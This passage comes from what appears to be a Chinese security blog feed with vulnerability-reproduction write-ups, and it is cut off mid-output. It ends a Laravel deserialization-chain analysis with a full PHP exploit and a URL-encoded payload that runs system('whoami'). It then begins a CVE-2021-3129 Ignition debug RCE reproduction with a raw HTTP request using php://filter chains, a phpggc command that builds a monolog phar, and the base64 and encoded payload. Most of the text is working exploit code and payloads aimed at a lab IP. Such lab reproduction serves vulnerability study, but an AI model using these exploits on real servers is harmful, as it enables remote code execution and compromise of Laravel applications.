class="keyword">$this</span>-&gt;bindings[<span class="string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>][<span class="string">&#x27;concrete&#x27;</span>] = <span class="string">&quot;Illuminate\Foundation\Application&quot;</span>;</span><br></pre></td></tr></table></figure><p>到了这里之后，我们再来调试，一直到</p><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210419211232.png"></p><p>此时的值为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$concrete</span> =&gt; Illuminate\Foundation\Application</span><br><span class="line"><span class="variable">$abstract</span> =&gt; Illuminate\Contracts\Console\Kernel</span><br></pre></td></tr></table></figure><p>进入 isBuildable 返回为 false，进入 make，当第二次来到上图位置时，此时值为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$concrete</span> =&gt; Illuminate\Foundation\Application</span><br><span class="line"><span class="variable">$abstract</span> =&gt; Illuminate\Foundation\Application</span><br></pre></td></tr></table></figure><p>可以进入 build 函数，过去之后就会进入 call</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"><span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$parameters</span> = [], <span class="variable">$defaultMethod</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> BoundMethod::call(<span class="keyword">$this</span>, <span class="variable">$callback</span>, <span class="variable">$parameters</span>, <span class="variable">$defaultMethod</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 此时值为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$callback</span> =&gt; system</span><br><span class="line"><span class="variable">$parameters</span> =&gt; [<span class="string">&#x27;whoami&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最终命令执行完成，exp 为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="variable">$test</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">bindings</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings[<span class="string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>][<span class="string">&#x27;concrete&#x27;</span>] = <span class="string">&quot;Illuminate\Foundation\Application&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">defaultGenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>([1,2]);</span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">        <span class="variable">$defaultGenerator</span>,</span><br><span class="line">        <span class="variable">$application</span>,</span><br><span class="line">        <span class="string">&quot;system&quot;</span>,</span><br><span class="line">        [<span class="string">&quot;whoami&quot;</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.136.167&#x2F;index.php&#x2F;user?user&#x3D;O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A2%3A%7Bi%3A0%3Bi%3A1%3Bi%3A1%3Bi%3A2%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7D</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对照着其他师傅的文章分析都有点吃力，还是太菜了，里边还有各种地方都很有问题，之后继续努力吧。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> cve </tag>
            
            <tag> 反序列化链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel＜=8.4.2 Debug RCE</title>
      <link href="2021/01/21/laravel%EF%BC%9C-8-4-2-Debug-RCE/"/>
      <url>2021/01/21/laravel%EF%BC%9C-8-4-2-Debug-RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>laravel &lt;= 8.4.2<br>Ignition &lt;= 2.5.1<br>开启debug</p><h2 id="CVE编号"><a href="#CVE编号" class="headerlink" title="CVE编号"></a>CVE编号</h2><p>CVE-2021-3129</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><h3 id="清空-log"><a href="#清空-log" class="headerlink" title="清空 log"></a>清空 log</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.136.167:8000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.136.167:8000&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 320</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;laravel&#x2F;storage&#x2F;logs&#x2F;laravel.log&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="生成phar文件并base64"><a href="#生成phar文件并base64" class="headerlink" title="生成phar文件并base64"></a>生成phar文件并base64</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d&#39;phar.readonly&#x3D;0&#39; .&#x2F;phpggc monolog&#x2F;rce1 call_user_func phpinfo --phar phar -o php:&#x2F;&#x2F;output | base64 -w0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQrZAgAAAgAAABEAAAABAAAAAACCAgAATzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7TzoyOToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czo3OiJwaHBpbmZvIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6MTQ6ImNhbGxfdXNlcl9mdW5jIjt9fXM6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6NzoicGhwaW5mbyI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5pdGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX19BQAAAGR1bW15BAAAANNQBGAEAAAADH5&#x2F;2LQBAAAAAAAACAAAAHRlc3QudHh0BAAAANNQBGAEAAAADH5&#x2F;2LQBAAAAAAAAdGVzdHRlc3R5dqEGHXRSkD3PRm3X6&#x2F;hNNh1MXQIAAABHQk1C</span><br></pre></td></tr></table></figure><h3 id="quoted-printable-encode"><a href="#quoted-printable-encode" class="headerlink" title="quoted-printable-encode"></a>quoted-printable-encode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python 3.8.5 (default, Jul 28 2020, 12:59:40) </span><br><span class="line">[GCC 9.3.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; a &#x3D; &#39;PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQrZAgAAAgAAABEAAAABAAAAAACCAgAATzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7TzoyOToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czo3OiJwaHBpbmZvIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6MTQ6ImNhbGxfdXNlcl9mdW5jIjt9fXM6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6NzoicGhwaW5mbyI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5pdGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX19BQAAAGR1bW15BAAAANNQBGAEAAAADH5&#x2F;2LQBAAAAAAAACAAAAHRlc3QudHh0BAAAANNQBGAEAAAADH5&#x2F;2LQBAAAAAAAAdGVzdHRlc3R5dqEGHXRSkD3PRm3X6&#x2F;hNNh1MXQIAAABHQk1C&#39;</span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.join([&quot;&#x3D;&quot; + hex(ord(i))[2:] + &quot;&#x3D;00&quot; for i in a]).upper()</span><br><span class="line">&#39;&#x3D;50&#x3D;00&#x3D;44&#x3D;00&#x3D;39&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;48&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;58&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;49&#x3D;00&#x3D;51&#x3D;00&#x3D;55&#x3D;00&#x3D;78&#x3D;00&#x3D;55&#x3D;00&#x3D;58&#x3D;00&#x3D;30&#x3D;00&#x3D;4E&#x3D;00&#x3D;50&#x3D;00&#x3D;54&#x3D;00&#x3D;56&#x3D;00&#x3D;42&#x3D;00&#x3D;4A&#x3D;00&#x3D;54&#x3D;00&#x3D;45&#x3D;00&#x3D;56&#x3D;00&#x3D;53&#x3D;00&#x3D;4B&#x3D;00&#x3D;43&#x3D;00&#x3D;6B&#x3D;00&#x3D;37&#x3D;00&#x3D;49&#x3D;00&#x3D;44&#x3D;00&#x3D;38&#x3D;00&#x3D;2B&#x3D;00&#x3D;44&#x3D;00&#x3D;51&#x3D;00&#x3D;72&#x3D;00&#x3D;5A&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;43&#x3D;00&#x3D;41&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;54&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;7A&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;54&#x3D;00&#x3D;57&#x3D;00&#x3D;39&#x3D;00&#x3D;75&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;78&#x3D;00&#x3D;49&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6B&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;58&#x3D;00&#x3D;46&#x3D;00&#x3D;4E&#x3D;00&#x3D;35&#x3D;00&#x3D;63&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;56&#x3D;00&#x3D;6B&#x3D;00&#x3D;63&#x3D;00&#x3D;45&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4F&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;63&#x3D;00&#x3D;32&#x3D;00&#x3D;39&#x3D;00&#x3D;6A&#x3D;00&#x3D;61&#x3D;00&#x3D;32&#x3D;00&#x3D;56&#x3D;00&#x3D;30&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;50&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;35&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;4E&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;35&#x3D;00&#x3D;76&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;39&#x3D;00&#x3D;6E&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;63&#x3D;00&#x3D;51&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;53&#x3D;00&#x3D;47&#x3D;00&#x3D;46&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4D&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;61&#x3D;00&#x3D;47&#x3D;00&#x3D;46&#x3D;00&#x3D;75&#x3D;00&#x3D;5A&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;79&#x3D;00&#x3D;4F&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;54&#x3D;00&#x3D;57&#x3D;00&#x3D;39&#x3D;00&#x3D;75&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;78&#x3D;00&#x3D;76&#x3D;00&#x3D;5A&#x3D;00&#x3D;31&#x3D;00&#x3D;78&#x3D;00&#x3D;49&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6B&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;58&#x3D;00&#x3D;45&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6B&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;63&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;41&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;68&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;52&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;34&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4D&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;59&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;55&#x3D;00&#x3D;32&#x3D;00&#x3D;6C&#x3D;00&#x3D;36&#x3D;00&#x3D;5A&#x3D;00&#x3D;53&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;74&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;6E&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;41&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;79&#x3D;00&#x3D;4F&#x3D;00&#x3D;6E&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;41&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;33&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;48&#x3D;00&#x3D;42&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;76&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;55&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;78&#x3D;00&#x3D;6C&#x3D;00&#x3D;64&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;73&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;4F&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;34&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;0